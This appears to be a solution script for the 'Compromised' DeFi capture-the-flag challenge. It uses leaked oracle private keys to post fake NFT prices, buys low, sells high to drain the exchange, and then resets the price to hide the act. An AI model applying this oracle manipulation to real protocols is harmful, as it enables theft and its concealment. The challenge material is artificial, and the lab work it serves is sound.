...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    const oracle2 = new ethers.Wallet(key1, ethers.provider);
    const oracle3 = new ethers.Wallet(key2, ethers.provider);

    const buyPrice = ethers.utils.parseEther("0.00000000001");
    const sellPrice = ethers.utils.parseEther("9990");

    // BUY
    await this.oracle.connect(oracle2).postPrice("DVNFT", buyPrice);
    await this.oracle.connect(oracle3).postPrice("DVNFT", buyPrice);
    await this.exchange.connect(attacker).buyOne({ value: buyPrice });

    // SELL
    await this.oracle.connect(oracle2).postPrice("DVNFT", sellPrice);
    await this.oracle.connect(oracle3).postPrice("DVNFT", sellPrice);
    await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
    await this.exchange.connect(attacker).sellOne(0);

    //COVER MALICIOUS ACT
    await this.oracle.connect(oracle2).postPrice("DVNFT", INITIAL_NFT_PRICE);
    await this.oracle.connect(oracle3).postPrice("DVNFT", INITIAL_NFT_PRICE);
  });
